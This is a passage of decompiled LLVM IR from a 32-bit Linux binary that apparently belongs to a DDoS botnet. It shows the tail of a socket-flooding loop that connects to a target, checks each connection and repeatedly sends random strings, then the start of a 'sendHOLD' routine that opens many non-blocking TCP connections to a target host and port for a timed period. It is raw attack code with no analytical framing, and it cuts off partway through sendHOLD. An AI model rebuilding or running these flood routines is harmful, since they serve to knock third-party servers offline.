  %v2_804f7d3 = add i32 %v1_804f7d3, 4
  %v3_804f7d3 = inttoptr i32 %v2_804f7d3 to i32*
  store i32 %v2_804f642, i32* %v3_804f7d3, align 4
  %v0_804f7d7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f7d7 = load i32, i32* @esp, align 4
  %v2_804f7d7 = inttoptr i32 %v1_804f7d7 to i32*
  store i32 %v0_804f7d7, i32* %v2_804f7d7, align 4
  %v2_804f7da = load i32, i32* %stack_var_-204, align 4
  %v3_804f7da = call i32 @__libc_connect(i32 %v7_804f71c, i32 %v12_804f606, i32 %v2_804f7da)
  store i32 %v3_804f7da, i32* %eax.global-to-local, align 4
  %v10_804f7df = icmp eq i32 %v3_804f7da, -1
  %v1_804f7e2 = icmp eq i1 %v10_804f7df, false
  br i1 %v1_804f7e2, label %dec_label_pc_804f7f0, label %dec_label_pc_804f7e4

dec_label_pc_804f7e4:                             ; preds = %dec_label_pc_804f752
  %v1_804f7e4 = call i32 @__errno_location(i32 %v7_804f71c)
  store i32 %v1_804f7e4, i32* %eax.global-to-local, align 4
  %v1_804f7e9 = inttoptr i32 %v1_804f7e4 to i32*
  %v2_804f7e9 = load i32, i32* %v1_804f7e9, align 4
  store i32 %v2_804f7e9, i32* %eax.global-to-local, align 4
  %v9_804f7eb = icmp eq i32 %v2_804f7e9, 115
  br i1 %v9_804f7eb, label %dec_label_pc_804f806, label %dec_label_pc_804f7f0

dec_label_pc_804f7f0:                             ; preds = %dec_label_pc_804f7e4, %dec_label_pc_804f752
  store i32 %storemerge41, i32* %eax.global-to-local, align 4
  store i32 %v2_804f69a, i32* %edx.global-to-local, align 4
  %v5_804f7f6 = load i32, i32* %v4_804f77f, align 8
  store i32 %v5_804f7f6, i32* %eax.global-to-local, align 4
  %v1_804f7f9 = load i32, i32* @esp, align 4
  %v2_804f7f9 = inttoptr i32 %v1_804f7f9 to i32*
  store i32 %v5_804f7f6, i32* %v2_804f7f9, align 4
  %v1_804f7fc = call i32 @__libc_close(i32 %v7_804f71c)
  store i32 %v1_804f7fc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f9b0

dec_label_pc_804f806:                             ; preds = %dec_label_pc_804f7e4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f69a, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_804f71c, align 4
  br label %dec_label_pc_804f9b0

dec_label_pc_804f816:                             ; preds = %dec_label_pc_804f716
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804f820, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804f827 = call i8* @_memset(i8* %tmp31, i32 0, i32 32)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f69a, i32* %eax.global-to-local, align 4
  %v3_804f835 = add i32 %v2_804f71c, %v2_804f69a
  %v4_804f835 = inttoptr i32 %v3_804f835 to i32*
  %v5_804f835 = load i32, i32* %v4_804f835, align 8
  %v2_804f83a = udiv i32 %v5_804f835, 32
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f69a, i32* %eax.global-to-local, align 4
  %v5_804f843 = load i32, i32* %v4_804f835, align 8
  %v1_804f846 = urem i32 %v5_804f843, 32
  store i32 %v1_804f846, i32* %eax.global-to-local, align 4
  %v0_804f849 = load i32, i32* @ebp, align 4
  %v2_804f849 = mul nuw nsw i32 %v2_804f83a, 4
  %v3_804f849 = add nsw i32 %v2_804f849, -184
  %v4_804f849 = add i32 %v3_804f849, %v0_804f849
  %v5_804f849 = inttoptr i32 %v4_804f849 to i32*
  %v6_804f849 = load i32, i32* %v5_804f849, align 4
  %v9_804f849 = shl i32 1, %v1_804f846
  %v12_804f849 = or i32 %v6_804f849, %v9_804f849
  store i32 %v12_804f849, i32* %v5_804f849, align 4
  store i32 0, i32* %stack_var_-196, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f69a, i32* %eax.global-to-local, align 4
  %v5_804f86b = load i32, i32* %v4_804f835, align 8
  %v1_804f86e = add i32 %v5_804f86b, 1
  store i32 %v1_804f86e, i32* %edx.global-to-local, align 4
  %v1_804f877 = load i32, i32* @esp, align 4
  %v2_804f877 = add i32 %v1_804f877, 16
  %v3_804f877 = inttoptr i32 %v2_804f877 to i32*
  store i32 %v2_804f871, i32* %v3_804f877, align 4
  %v0_804f87b = load i32, i32* @esp, align 4
  %v1_804f87b = add i32 %v0_804f87b, 12
  %v2_804f87b = inttoptr i32 %v1_804f87b to i32*
  store i32 0, i32* %v2_804f87b, align 4
  store i32 %v2_804f820, i32* %eax.global-to-local, align 4
  %v1_804f889 = load i32, i32* @esp, align 4
  %v2_804f889 = add i32 %v1_804f889, 8
  %v3_804f889 = inttoptr i32 %v2_804f889 to i32*
  store i32 %v2_804f820, i32* %v3_804f889, align 4
  %v0_804f88d = load i32, i32* @esp, align 4
  %v1_804f88d = add i32 %v0_804f88d, 4
  %v2_804f88d = inttoptr i32 %v1_804f88d to i32*
  store i32 0, i32* %v2_804f88d, align 4
  %v0_804f895 = load i32, i32* %edx.global-to-local, align 4
  %v1_804f895 = load i32, i32* @esp, align 4
  %v2_804f895 = inttoptr i32 %v1_804f895 to i32*
  store i32 %v0_804f895, i32* %v2_804f895, align 4
  %v0_804f898 = load i32, i32* %stack_var_-196, align 4
  %v2_804f898 = load i32, i32* %stack_var_-188, align 4
  %v5_804f898 = call i32 @__libc_select(i32 %v0_804f898, i32 10000, i32 %v2_804f898, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804f898, i32* %eax.global-to-local, align 4
  %v12_804f8a0 = icmp eq i32 %v5_804f898, 1
  %v1_804f8a4 = icmp eq i1 %v12_804f8a0, false
  br i1 %v1_804f8a4, label %dec_label_pc_804f920, label %dec_label_pc_804f8a6

dec_label_pc_804f8a6:                             ; preds = %dec_label_pc_804f816
  store i32 4, i32* %stack_var_-200, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f69a, i32* %eax.global-to-local, align 4
  %v5_804f8b6 = load i32, i32* %v4_804f835, align 8
  store i32 %v5_804f8b6, i32* %edx.global-to-local, align 4
  %v1_804f8bf = load i32, i32* @esp, align 4
  %v2_804f8bf = add i32 %v1_804f8bf, 16
  %v3_804f8bf = inttoptr i32 %v2_804f8bf to i32*
  store i32 %v2_804f8b9, i32* %v3_804f8bf, align 4
  store i32 %v2_804f8c3, i32* %eax.global-to-local, align 4
  %v1_804f8c9 = load i32, i32* @esp, align 4
  %v2_804f8c9 = add i32 %v1_804f8c9, 12
  %v3_804f8c9 = inttoptr i32 %v2_804f8c9 to i32*
  store i32 %v2_804f8c3, i32* %v3_804f8c9, align 4
  %v0_804f8cd = load i32, i32* @esp, align 4
  %v1_804f8cd = add i32 %v0_804f8cd, 8
  %v2_804f8cd = inttoptr i32 %v1_804f8cd to i32*
  store i32 4, i32* %v2_804f8cd, align 4
  %v0_804f8d5 = load i32, i32* @esp, align 4
  %v1_804f8d5 = add i32 %v0_804f8d5, 4
  %v2_804f8d5 = inttoptr i32 %v1_804f8d5 to i32*
  store i32 1, i32* %v2_804f8d5, align 4
  %v0_804f8dd = load i32, i32* %edx.global-to-local, align 4
  %v1_804f8dd = load i32, i32* @esp, align 4
  %v2_804f8dd = inttoptr i32 %v1_804f8dd to i32*
  store i32 %v0_804f8dd, i32* %v2_804f8dd, align 4
  %v0_804f8e0 = load i32, i32* %stack_var_-200, align 4
  %v1_804f8e0 = load i32, i32* %stack_var_-196, align 4
  %v3_804f8e0 = load i32, i32* %stack_var_-188, align 4
  %v5_804f8e0 = call i32 @getsockopt(i32 %v0_804f8e0, i32 %v1_804f8e0, i32 10000, i32 %v3_804f8e0, i32 ptrtoint (i32* @0 to i32))
  %v3_804f8e5 = load i32, i32* %stack_var_-204, align 4
  %v1_804f8eb = icmp eq i32 %v3_804f8e5, 0
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f69a, i32* %eax.global-to-local, align 4
  br i1 %v1_804f8eb, label %dec_label_pc_804f910, label %dec_label_pc_804f8ef

dec_label_pc_804f8ef:                             ; preds = %dec_label_pc_804f8a6
  %v5_804f8f5 = load i32, i32* %v4_804f835, align 8
  store i32 %v5_804f8f5, i32* %eax.global-to-local, align 4
  %v1_804f8f8 = load i32, i32* @esp, align 4
  %v2_804f8f8 = inttoptr i32 %v1_804f8f8 to i32*
  store i32 %v5_804f8f5, i32* %v2_804f8f8, align 4
  %v0_804f8fb = load i32, i32* %stack_var_-200, align 4
  %v1_804f8fb = call i32 @__libc_close(i32 %v0_804f8fb)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f69a, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804f71c, align 4
  br label %dec_label_pc_804f9b0

dec_label_pc_804f910:                             ; preds = %dec_label_pc_804f8a6
  store i8 2, i8* %v5_804f71c, align 4
  br label %dec_label_pc_804f9b0

dec_label_pc_804f920:                             ; preds = %dec_label_pc_804f816
  %v13_804f920 = icmp eq i32 %v5_804f898, -1
  %v1_804f924 = icmp eq i1 %v13_804f920, false
  br i1 %v1_804f924, label %dec_label_pc_804f9b0, label %dec_label_pc_804f92a

dec_label_pc_804f92a:                             ; preds = %dec_label_pc_804f920
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f69a, i32* %eax.global-to-local, align 4
  %v5_804f930 = load i32, i32* %v4_804f835, align 8
  store i32 %v5_804f930, i32* %eax.global-to-local, align 4
  %v1_804f933 = load i32, i32* @esp, align 4
  %v2_804f933 = inttoptr i32 %v1_804f933 to i32*
  store i32 %v5_804f930, i32* %v2_804f933, align 4
  %v1_804f936 = call i32 @__libc_close(i32 %v5_804f898)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f69a, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804f71c, align 4
  br label %dec_label_pc_804f9b0

dec_label_pc_804f948:                             ; preds = %dec_label_pc_804f737
  %v0_804f948 = load i32, i32* @esp, align 4
  %v1_804f948 = add i32 %v0_804f948, 4
  %v2_804f948 = inttoptr i32 %v1_804f948 to i32*
  store i32 1024, i32* %v2_804f948, align 4
  store i32 %v1_804f6cd, i32* %eax.global-to-local, align 4
  %v1_804f953 = load i32, i32* @esp, align 4
  %v2_804f953 = inttoptr i32 %v1_804f953 to i32*
  store i32 %v1_804f6cd, i32* %v2_804f953, align 4
  %v2_804f956 = inttoptr i32 %v7_804f71c to i8*
  %v3_804f956 = call i32 @makeRandomStr(i8* %v2_804f956, i32 %v12_804f606)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f69a, i32* %eax.global-to-local, align 4
  %v3_804f961 = add i32 %v2_804f71c, %v2_804f69a
  %v4_804f961 = inttoptr i32 %v3_804f961 to i32*
  %v5_804f961 = load i32, i32* %v4_804f961, align 8
  store i32 %v5_804f961, i32* %edx.global-to-local, align 4
  %v0_804f964 = load i32, i32* @esp, align 4
  %v1_804f964 = add i32 %v0_804f964, 12
  %v2_804f964 = inttoptr i32 %v1_804f964 to i32*
  store i32 16384, i32* %v2_804f964, align 4
  %v0_804f96c = load i32, i32* @esp, align 4
  %v1_804f96c = add i32 %v0_804f96c, 8
  %v2_804f96c = inttoptr i32 %v1_804f96c to i32*
  store i32 1024, i32* %v2_804f96c, align 4
  store i32 %v1_804f6cd, i32* %eax.global-to-local, align 4
  %v1_804f977 = load i32, i32* @esp, align 4
  %v2_804f977 = add i32 %v1_804f977, 4
  %v3_804f977 = inttoptr i32 %v2_804f977 to i32*
  store i32 %v1_804f6cd, i32* %v3_804f977, align 4
  %v0_804f97b = load i32, i32* %edx.global-to-local, align 4
  %v1_804f97b = load i32, i32* @esp, align 4
  %v2_804f97b = inttoptr i32 %v1_804f97b to i32*
  store i32 %v0_804f97b, i32* %v2_804f97b, align 4
  %v0_804f97e = load i32, i32* %stack_var_-200, align 4
  %v1_804f97e = load i32, i32* %stack_var_-196, align 4
  %v3_804f97e = load i32, i32* %stack_var_-188, align 4
  %v4_804f97e = call i32 @__libc_send(i32 %v0_804f97e, i32 %v1_804f97e, i32 %stack_var_-192.140, i32 %v3_804f97e)
  store i32 %v4_804f97e, i32* %eax.global-to-local, align 4
  %v10_804f983 = icmp eq i32 %v4_804f97e, -1
  %v1_804f986 = icmp eq i1 %v10_804f983, false
  br i1 %v1_804f986, label %dec_label_pc_804f9b0, label %dec_label_pc_804f988

dec_label_pc_804f988:                             ; preds = %dec_label_pc_804f948
  %v0_804f988 = load i32, i32* %stack_var_-200, align 4
  %v1_804f988 = call i32 @__errno_location(i32 %v0_804f988)
  store i32 %v1_804f988, i32* %eax.global-to-local, align 4
  %v1_804f98d = inttoptr i32 %v1_804f988 to i32*
  %v2_804f98d = load i32, i32* %v1_804f98d, align 4
  store i32 %v2_804f98d, i32* %eax.global-to-local, align 4
  %v9_804f98f = icmp eq i32 %v2_804f98d, 11
  br i1 %v9_804f98f, label %dec_label_pc_804f9b0, label %dec_label_pc_804f994

dec_label_pc_804f994:                             ; preds = %dec_label_pc_804f988
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f69a, i32* %eax.global-to-local, align 4
  %v5_804f99a = load i32, i32* %v4_804f961, align 8
  store i32 %v5_804f99a, i32* %eax.global-to-local, align 4
  %v1_804f99d = load i32, i32* @esp, align 4
  %v2_804f99d = inttoptr i32 %v1_804f99d to i32*
  store i32 %v5_804f99a, i32* %v2_804f99d, align 4
  %v0_804f9a0 = load i32, i32* %stack_var_-200, align 4
  %v1_804f9a0 = call i32 @__libc_close(i32 %v0_804f9a0)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f69a, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804f71c, align 4
  br label %dec_label_pc_804f9b0

dec_label_pc_804f9b0:                             ; preds = %dec_label_pc_804f744, %dec_label_pc_804f988, %dec_label_pc_804f948, %dec_label_pc_804f920, %dec_label_pc_804f92a, %dec_label_pc_804f910, %dec_label_pc_804f8ef, %dec_label_pc_804f806, %dec_label_pc_804f7f0, %dec_label_pc_804f994
  %stack_var_-192.0 = phi i32 [ 10000, %dec_label_pc_804f920 ], [ 10000, %dec_label_pc_804f92a ], [ 10000, %dec_label_pc_804f910 ], [ 10000, %dec_label_pc_804f8ef ], [ %stack_var_-192.140, %dec_label_pc_804f948 ], [ %stack_var_-192.140, %dec_label_pc_804f988 ], [ %stack_var_-192.140, %dec_label_pc_804f994 ], [ %stack_var_-192.140, %dec_label_pc_804f7f0 ], [ %stack_var_-192.140, %dec_label_pc_804f806 ], [ %stack_var_-192.140, %dec_label_pc_804f744 ]
  %v4_804f9b0 = add nuw nsw i32 %storemerge41, 1
  store i32 %v4_804f9b0, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804f9b0, %v2_804f622
  br i1 %exitcond, label %dec_label_pc_804f9bf, label %dec_label_pc_804f716

dec_label_pc_804f9bf:                             ; preds = %dec_label_pc_804f9b3.preheader, %dec_label_pc_804f9b0, %dec_label_pc_804f660
  %stack_var_-192.2 = phi i32 [ %tmp2, %dec_label_pc_804f660 ], [ %stack_var_-192.2, %dec_label_pc_804f9b3.preheader ], [ %stack_var_-192.0, %dec_label_pc_804f9b0 ]
  %stack_var_-36.0 = phi i32 [ %tmp6, %dec_label_pc_804f660 ], [ 0, %dec_label_pc_804f9b3.preheader ], [ %v2_804f622, %dec_label_pc_804f9b0 ]
  %v0_804f9bf = load i32, i32* @esp, align 4
  %v1_804f9bf = inttoptr i32 %v0_804f9bf to i32*
  store i32 0, i32* %v1_804f9bf, align 4
  %v1_804f9c6 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_804f9c6 = call i32 @__GI_time(i32* %v1_804f9c6)
  store i32 %v2_804f9c6, i32* %eax.global-to-local, align 4
  %v5_804f9ce = icmp slt i32 %v2_804f9c6, %v5_804f6ff
  br i1 %v5_804f9ce, label %dec_label_pc_804f9b3.preheader, label %dec_label_pc_804f9d4

dec_label_pc_804f9b3.preheader:                   ; preds = %dec_label_pc_804f9bf
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v16_804f9b638, label %dec_label_pc_804f716, label %dec_label_pc_804f9bf

dec_label_pc_804f9d4:                             ; preds = %dec_label_pc_804f9bf, %entry
  %v0_804f9e0 = phi i32 [ %v3_804f652, %entry ], [ %v2_804f9c6, %dec_label_pc_804f9bf ]
  %v2_804f9dd = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804f9dd, i32* @ebx, align 4
  store i32 %v0_804f604, i32* @edi, align 4
  ret i32 %v0_804f9e0

; uselistorder directives
  uselistorder i32 %v4_804f9b0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-192.0, { 1, 0 }
  uselistorder i32 %v5_804f898, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804f846, { 1, 0 }
  uselistorder i32* %v4_804f835, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v7_804f71c, { 6, 1, 0, 2, 3, 4, 5, 7 }
  uselistorder i8* %v5_804f71c, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %stack_var_-192.140, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %storemerge41, { 5, 13, 12, 11, 7, 6, 10, 9, 8, 4, 3, 2, 19, 18, 17, 16, 15, 14, 0, 1 }
  uselistorder i32 %v1_804f6cd, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32 %v2_804f6b7, { 1, 0 }
  uselistorder i32 %v2_804f69a, { 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 23, 22, 21, 20, 2, 19, 3, 7, 24, 6, 4, 5 }
  uselistorder i32 %v1_804f630, { 1, 0 }
  uselistorder i32 %v2_804f622, { 3, 2, 0, 1 }
  uselistorder i32 %v1_804f614, { 1, 0, 2 }
  uselistorder i32 %v12_804f606, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 2, 3, 1, 0, 4 }
  uselistorder i32* %stack_var_-196, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-200, { 2, 0, 3, 1, 4, 5, 6 }
  uselistorder i32* %stack_var_-204, { 4, 3, 1, 0, 2, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* %eax.global-to-local, { 52, 1, 43, 0, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 14, 15, 13, 16, 17, 21, 18, 19, 20, 22, 23, 25, 24, 28, 26, 27, 29, 30, 34, 31, 32, 33, 35, 36, 37, 38, 39, 40, 41, 42, 44, 46, 45, 47, 49, 48, 50, 51 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f9b0, { 9, 1, 2, 4, 3, 5, 6, 7, 8, 0 }
}

define i32 @sendHOLD(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f9e4 = load i32, i32* @edi, align 4
  %v0_804f9e5 = load i32, i32* @ebx, align 4
  store i32 %v0_804f9e5, i32* %stack_var_-12, align 4
  %v12_804f9e6 = ptrtoint i32* %stack_var_-252 to i32
  store i32 %v12_804f9e6, i32* %eax.global-to-local, align 4
  %v1_804f9f4 = call i32 @getdtablesize(i32 %v12_804f9e6)
  store i32 %v1_804f9f4, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_804f9f4, 0
  %v2_804f9fd = zext i1 %tmp to i32
  %v2_804fa00 = add i32 %v2_804f9fd, %v1_804f9f4
  %v2_804fa02 = sdiv i32 %v2_804fa00, 2
  store i32 2, i32* %stack_var_-68, align 4
  %v1_804fa10 = urem i32 %arg2, 65536
  store i32 %v1_804fa10, i32* %eax.global-to-local, align 4
  store i32 %v1_804fa10, i32* %stack_var_-252, align 4
  %v1_804fa16 = trunc i32 %arg2 to i16
  %v2_804fa16 = call i32 @htons(i16 %v1_804fa16)
  %v2_804fa22 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-252, align 4
  %v3_804fa32 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v3_804fa32, i32* %eax.global-to-local, align 4
  %v1_804fa37 = icmp eq i32 %v3_804fa32, 0
  br i1 %v1_804fa37, label %dec_label_pc_804fa40, label %dec_label_pc_804fdfb

dec_label_pc_804fa40:                             ; preds = %entry
  %v2_804fa56 = mul i32 %v2_804fa02, 8
  %v1_804fa5c = add i32 %v2_804fa56, 30
  %v2_804fa5f = and i32 %v1_804fa5c, -16
  %v0_804fa65 = load i32, i32* @esp, align 4
  %v2_804fa65 = sub i32 %v0_804fa65, %v2_804fa5f
  %v1_804fa77 = add i32 %v2_804fa65, 35
  %v2_804fa7a = and i32 %v1_804fa77, -16
  %v2_804fa97 = mul i32 %v2_804fa02, 5
  store i32 %v2_804fa97, i32* %edx.global-to-local, align 4
  %v1_804fa9d = inttoptr i32 %v2_804fa7a to i8*
  store i32 %v2_804fa7a, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804faa2 = and i32 %v1_804fa77, -256
  store i32 %v1_804faa2, i32* %eax.global-to-local, align 4
  %v5_804faa4 = call i8* @_memset(i8* %v1_804fa9d, i32 %v1_804faa2, i32 %v2_804fa97)
  %v0_804faa6 = load i32, i32* @esp, align 4
  %v1_804faa6 = inttoptr i32 %v0_804faa6 to i32*
  store i32 1024, i32* %v1_804faa6, align 4
  %v1_804faad = call i32 @malloc(i32 %v2_804fa7a)
  store i32 %v1_804faad, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804fabf = load i32, i32* @esp, align 4
  %v2_804fabf = add i32 %v1_804fabf, 8
  %v3_804fabf = inttoptr i32 %v2_804fabf to i32*
  store i32 1024, i32* %v3_804fabf, align 4
  %v0_804fac3 = load i32, i32* @esp, align 4
  %v1_804fac3 = add i32 %v0_804fac3, 4
  %v2_804fac3 = inttoptr i32 %v1_804fac3 to i32*
  store i32 0, i32* %v2_804fac3, align 4
  %v0_804facb = load i32, i32* %edx.global-to-local, align 4
  %v1_804facb = load i32, i32* @esp, align 4
  %v2_804facb = inttoptr i32 %v1_804facb to i32*
  store i32 %v0_804facb, i32* %v2_804facb, align 4
  %v3_804face = inttoptr i32 %v1_804faad to i8*
  %v4_804face = call i32 @__GI_memset(i8* %v3_804face, i32 %tmp9, i32 %tmp6)
  store i32 %v4_804face, i32* %eax.global-to-local, align 4
  %v0_804fad3 = load i32, i32* @esp, align 4
  %v1_804fad3 = inttoptr i32 %v0_804fad3 to i32*
  store i32 0, i32* %v1_804fad3, align 4
  %v1_804fada = inttoptr i32 %v1_804faad to i32*
  %v2_804fada = call i32 @__GI_time(i32* %v1_804fada)
  %v5_804fadf = add i32 %v2_804fada, %arg3
  store i32 %v5_804fadf, i32* %eax.global-to-local, align 4
  %v3_804fafc = or i32 %v2_804fa7a, 4
  %v2_804fc00 = ptrtoint i32* %stack_var_-196 to i32
  %tmp33 = bitcast i32* %stack_var_-196 to i8*
  %v2_804fc51 = ptrtoint i32* %stack_var_-204 to i32
  %v2_804fc99 = ptrtoint i32* %stack_var_-208 to i32
  %v2_804fca3 = ptrtoint i32* %stack_var_-212 to i32
  %v16_804fddd40 = icmp sgt i32 %v2_804fa00, 1
  br label %dec_label_pc_804fde6

dec_label_pc_804faf6:                             ; preds = %dec_label_pc_804fdda.preheader, %dec_label_pc_804fdd7
  %storemerge42 = phi i32 [ %v4_804fdd7, %dec_label_pc_804fdd7 ], [ 0, %dec_label_pc_804fdda.preheader ]
  store i32 %storemerge42, i32* %eax.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %edx.global-to-local, align 4
  %v2_804fafc = mul i32 %storemerge42, 8
  %v4_804fafc = add i32 %v2_804fafc, %v3_804fafc
  %v5_804fafc = inttoptr i32 %v4_804fafc to i8*
  %v6_804fafc = load i8, i8* %v5_804fafc, align 4
  %v7_804fafc = zext i8 %v6_804fafc to i32
  store i32 %v7_804fafc, i32* %eax.global-to-local, align 4
  %v8_804fb0a = icmp eq i8 %v6_804fafc, 0
  %v12_804fb0a = icmp eq i8 %v6_804fafc, 1
  br i1 %v12_804fb0a, label %dec_label_pc_804fbf6, label %dec_label_pc_804fb17

dec_label_pc_804fb17:                             ; preds = %dec_label_pc_804faf6
  %v12_804fb17 = icmp eq i8 %v6_804fafc, 2
  br i1 %v12_804fb17, label %dec_label_pc_804fd2b, label %dec_label_pc_804fb24

dec_label_pc_804fb24:                             ; preds = %dec_label_pc_804fb17
  br i1 %v8_804fb0a, label %dec_label_pc_804fb32, label %dec_label_pc_804fdd7

dec_label_pc_804fb32:                             ; preds = %dec_label_pc_804fb24
  store i32 %storemerge42, i32* @ebx, align 4
  %v0_804fb35 = load i32, i32* @esp, align 4
  %v1_804fb35 = add i32 %v0_804fb35, 8
  %v2_804fb35 = inttoptr i32 %v1_804fb35 to i32*
  store i32 0, i32* %v2_804fb35, align 4
  %v0_804fb3d = load i32, i32* @esp, align 4
  %v1_804fb3d = add i32 %v0_804fb3d, 4
  %v2_804fb3d = inttoptr i32 %v1_804fb3d to i32*
  store i32 1, i32* %v2_804fb3d, align 4
  %v0_804fb45 = load i32, i32* @esp, align 4
  %v1_804fb45 = inttoptr i32 %v0_804fb45 to i32*
  store i32 2, i32* %v1_804fb45, align 4
  %v3_804fb4c = call i32 @socket(i32 %v7_804fafc, i32 %v12_804f9e6, i32 ptrtoint (i32* @0 to i32))
  %v2_804fb56 = load i32, i32* @ebx, align 4
  %v3_804fb56 = mul i32 %v2_804fb56, 8
  %v4_804fb56 = add i32 %v3_804fb56, %v2_804fa7a
  %v5_804fb56 = inttoptr i32 %v4_804fb56 to i32*
  store i32 %v3_804fb4c, i32* %v5_804fb56, align 8
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  %v3_804fb5f = add i32 %v2_804fafc, %v2_804fa7a
  %v4_804fb5f = inttoptr i32 %v3_804fb5f to i32*
  %v5_804fb5f = load i32, i32* %v4_804fb5f, align 8
  store i32 %v5_804fb5f, i32* %eax.global-to-local, align 4
  %v0_804fb62 = load i32, i32* @esp, align 4
  %v1_804fb62 = add i32 %v0_804fb62, 8
  %v2_804fb62 = inttoptr i32 %v1_804fb62 to i32*
  store i32 0, i32* %v2_804fb62, align 4
  %v0_804fb6a = load i32, i32* @esp, align 4
  %v1_804fb6a = add i32 %v0_804fb6a, 4
  %v2_804fb6a = inttoptr i32 %v1_804fb6a to i32*
  store i32 3, i32* %v2_804fb6a, align 4
  %v0_804fb72 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fb72 = load i32, i32* @esp, align 4
  %v2_804fb72 = inttoptr i32 %v1_804fb72 to i32*
  store i32 %v0_804fb72, i32* %v2_804fb72, align 4
  %v3_804fb75 = call i32 @__libc_fcntl(i32 %v7_804fafc, i32 %v12_804f9e6, i32 ptrtoint (i32* @0 to i32))
  %v1_804fb7c = or i32 %v3_804fb75, 2048
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  %v5_804fb88 = load i32, i32* %v4_804fb5f, align 8
  store i32 %v5_804fb88, i32* %eax.global-to-local, align 4
  %v1_804fb8b = load i32, i32* @esp, align 4
  %v2_804fb8b = add i32 %v1_804fb8b, 8
  %v3_804fb8b = inttoptr i32 %v2_804fb8b to i32*
  store i32 %v1_804fb7c, i32* %v3_804fb8b, align 4
  %v0_804fb8f = load i32, i32* @esp, align 4
  %v1_804fb8f = add i32 %v0_804fb8f, 4
  %v2_804fb8f = inttoptr i32 %v1_804fb8f to i32*
  store i32 4, i32* %v2_804fb8f, align 4
  %v0_804fb97 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fb97 = load i32, i32* @esp, align 4
  %v2_804fb97 = inttoptr i32 %v1_804fb97 to i32*
  store i32 %v0_804fb97, i32* %v2_804fb97, align 4
  %v3_804fb9a = call i32 @__libc_fcntl(i32 %v7_804fafc, i32 %v12_804f9e6, i32 ptrtoint (i32* @0 to i32))
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  %v5_804fba8 = load i32, i32* %v4_804fb5f, align 8
  store i32 %v5_804fba8, i32* %eax.global-to-local, align 4
  %v0_804fbab = load i32, i32* @esp, align 4
  %v1_804fbab = add i32 %v0_804fbab, 8
  %v2_804fbab = inttoptr i32 %v1_804fbab to i32*
  store i32 16, i32* %v2_804fbab, align 4
  %v1_804fbb3 = load i32, i32* @esp, align 4
  %v2_804fbb3 = add i32 %v1_804fbb3, 4
